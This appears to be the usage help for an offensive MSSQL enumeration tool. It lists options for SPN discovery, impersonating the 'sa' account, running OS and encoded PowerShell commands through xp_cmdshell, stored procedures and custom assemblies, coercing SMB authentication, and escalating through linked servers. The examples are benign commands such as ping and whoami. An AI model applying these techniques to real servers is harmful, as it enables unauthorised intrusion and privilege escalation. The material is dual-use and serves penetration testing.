
             _____ _____ _____ _____ __    _____
            |     |   __|   __|     |  |  |   __|___ _ _ _____
            | | | |__   |__   |  |  |  |__|   __|   | | |     |
            |_|_|_|_____|_____|__  _|_____|_____|_|_|___|_|_|_|
                                 |__|
@SecurityIsAGame



***********************************************************************************************

-getspn
Argument does not require the server parameter and can be ran on its own,
SPNs are always ran first and will output first.
Added the ability to search for MSSQLSvc accounts so that you can quickly find potential targets

***********************************************************************************************

-getspn [spn]            : Enumerate SPN accounts of the domain, if spn is included then only search for that spn
Otherwise collect all SPN's
                           Example:  .\MSSqlEnum.exe -getspn MSSQLSvc




REQUIRED ARGUMENTS

-server                  : Enter the server name or IP of the MSSQL server that you want to connect to.
                           Example: .\MSSqlEnum.exe -server sql1.example.com


OPTIONAL ARGUMENTS

-db                      : The database name, if none is provided then 'master' will be used
-username [username]     : The username to use to authenticate to the server
-password [password]     : The password to use to authenticate to the server
-domain                  : If the domain is set then it will query in the specified domain

-getlinked [server]      : This gets linked servers to the specified server that you request.
                           If you leave it blank then local server is used.
-roles                   : Get the server role of the current user
-impersonation           : Get the allowed to impersonate user accounts for the current user on the local server
-output [filename]       : Write output to file, if no filename is specified then c:\windows\Temp\result.txt is used
-getusers                : Get the users on the local server
-impersonate [user]      : Try to impersonate as a different account on the local server,
                           if a user is not specified then 'sa' user is tried by default
-command [command]       : This will run a command using xp_cmdshell, must have execute privileges or be in sysadmin group
                           then it will attempt to run as the impersonated user.
                           You can run multi argument commands but has to be double quoted

                           Example: .\MSSqlEnum.exe -server dc01 -impersonate sa -command "ping 192.168.0.1"

                           Also possible to run powershell commands by encoding the powershell command as base64.
                           The base64 below has been reduced to fit on the screen.

                           Example: .\MSSqlEnum.exe -server dc01 -impersonate sa -command "powershell -enc IABJAEUAB4AHQAJwApACkA"

-sp [command]            : Create a stored procedure and use wscript to run shell commands.  Must have sa privileges for this to work.
                           Command must be in double quotes and escaped if required

                           Example: MSSqlEnum.exe -server dc01 -sp "ping 192.168.0.1"
                           Example: MSSqlEnum.exe -server dc01 -sp "cmd /c echo \"P@Wn3d!\" > c:\windows\temp\h4x3d.txt"

-asm [command]           : Create a custom assembly and run a basic shell to execute commands, if command is not provided then 'whoami' will be ran
-clearasm                : Clear assembly, useful if the asm command fails but still creates the assembly
-query [query]           : Execute a sql query on the database, if no query is added then @@version is ran
-smb [IP]                : Get the local server to connect to and SMB share, IP must be provided
-linkserver [a,b,c]      : Try and run a query/command on a linked server, if the -query parameter is not included then it will run 'SELECT @@version' by default.
                           If the -query parameter is included with -linkserver parameter then it will run the query value on the specified linkserver.
                         : if you want to run a system command using xp cmdshell through a linked server(s) then include the -command parameter
                         : instead of the -query parameter
                           in the -linkserver parameter include the links you want to run commands on in the correct order
                           this can be used for privilege escalation via linked server authentication misconfigurations.

                           Example: .\MSSqlEnum.exe -server appsrv01 -linkserver dc01,appsrv01 -command "whoami"

-rpc                     : The argument will try to enable rpc out functionality on a linked server, requires sysadmin role
